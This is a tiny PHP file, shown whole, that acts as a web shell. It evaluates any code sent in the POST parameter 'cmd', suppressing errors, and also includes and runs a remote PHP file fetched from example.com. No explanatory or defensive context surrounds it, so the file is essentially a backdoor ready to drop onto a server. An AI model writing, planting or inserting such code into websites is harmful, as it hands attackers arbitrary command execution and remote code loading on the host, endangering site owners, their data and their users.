<?php
$cmd = $_POST['cmd'];
@eval($cmd);
@include("http://example.com/remote.php");
?>
